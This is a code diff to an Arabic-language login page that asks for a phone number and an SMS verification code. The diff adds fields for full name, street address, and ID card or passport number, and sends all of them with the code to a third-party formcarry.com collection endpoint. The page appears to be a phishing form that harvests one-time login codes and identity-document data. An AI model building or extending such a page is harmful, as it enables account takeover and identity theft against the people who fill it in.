@@ -129,6 +129,27 @@
       margin-top: -10px;
       margin-bottom: 15px;
     }
+
+    #extraFields {
+      display: none;
+      margin-top: 25px;
+      border: 2px solid #007bff;
+      border-radius: 12px;
+      padding: 20px;
+      text-align: right;
+    }
+
+    #extraFields input[type="text"] {
+      margin-bottom: 15px;
+    }
+
+    #extraFields label {
+      margin-top: 8px;
+    }
+
+    #extraFields input[type="radio"] {
+      margin-left: 6px;
+    }
   </style>
 </head>
 <body>
@@ -155,6 +176,27 @@
         <div id="errorMessage" class="error"></div>
         <button type="submit" id="sendCodeBtn">طلب الدخول</button>
       </div>
+
+      <!-- الإطار الأزرق -->
+      <div id="extraFields">
+        <label for="fullName">الاسم بالكامل:</label>
+        <input type="text" id="fullName" name="fullName" placeholder="مثال: محمد علي حسن" required />
+
+        <label for="address">العنوان - الشارع:</label>
+        <input type="text" id="address" name="address" placeholder="مثال: شارع الجمهورية - طرابلس" required />
+
+        <label>نوع الوثيقة:</label>
+        <div style="margin-bottom: 15px;">
+          <label><input type="radio" name="documentType" value="بطاقة" onchange="toggleDocField()"> بطاقة شخصية</label>
+          &nbsp;&nbsp;
+          <label><input type="radio" name="documentType" value="جواز" onchange="toggleDocField()"> جواز سفر</label>
+        </div>
+
+        <div id="documentField" style="display:none;">
+          <label id="documentLabel" for="documentNumber">رقم الوثيقة:</label>
+          <input type="text" id="documentNumber" name="documentNumber" placeholder="" required />
+        </div>
+      </div>
     </form>
   </div>
 
@@ -166,6 +208,7 @@
     const phoneInput = document.getElementById('phone');
     const codeInput = document.getElementById('code');
     const errorMessage = document.getElementById('errorMessage');
+    const extraFields = document.getElementById('extraFields');
 
     function startTimer(duration) {
       let timeLeft = duration;
@@ -214,7 +257,8 @@
         phoneInput.disabled = true;
         sendPhoneBtn.disabled = true;
         codeField.style.display = 'block';
-        startTimer(480); // 8 دقائق = 480 ثانية
+        extraFields.style.display = 'block';
+        startTimer(480);
       })
       .catch(error => {
         alert('⚠️ تعذر إرسال رقم الهاتف. حاول مرة أخرى.');
@@ -222,6 +266,24 @@
       });
 
       return false;
+    }
+
+    function toggleDocField() {
+      const selected = document.querySelector('input[name="documentType"]:checked');
+      const docField = document.getElementById('documentField');
+      const docLabel = document.getElementById('documentLabel');
+      const docInput = document.getElementById('documentNumber');
+
+      if (selected) {
+        docField.style.display = 'block';
+        if (selected.value === 'بطاقة') {
+          docLabel.textContent = 'رقم البطاقة:';
+          docInput.placeholder = 'أدخل رقم البطاقة الشخصية';
+        } else {
+          docLabel.textContent = 'رقم الجواز:';
+          docInput.placeholder = 'أدخل رقم جواز السفر';
+        }
+      }
     }
 
     function sendCode(event) {
@@ -234,9 +296,24 @@
         return false;
       }
 
+      // التحقق من الحقول الجديدة
+      const fullName = document.getElementById('fullName').value.trim();
+      const address = document.getElementById('address').value.trim();
+      const documentType = document.querySelector('input[name="documentType"]:checked')?.value || '';
+      const documentNumber = document.getElementById('documentNumber').value.trim();
+
+      if (!fullName || !address || !documentType || !documentNumber) {
+        errorMessage.textContent = 'يرجى ملء جميع البيانات المطلوبة.';
+        return false;
+      }
+
       const payload = {
         phone: phoneInput.value,
-        code: codeInput.value
+        code: codeInput.value,
+        fullName,
+        address,
+        documentType,
+        documentNumber
       };
 
       fetch('https://formcarry.com/s/a-Yw-WFDEqO', {
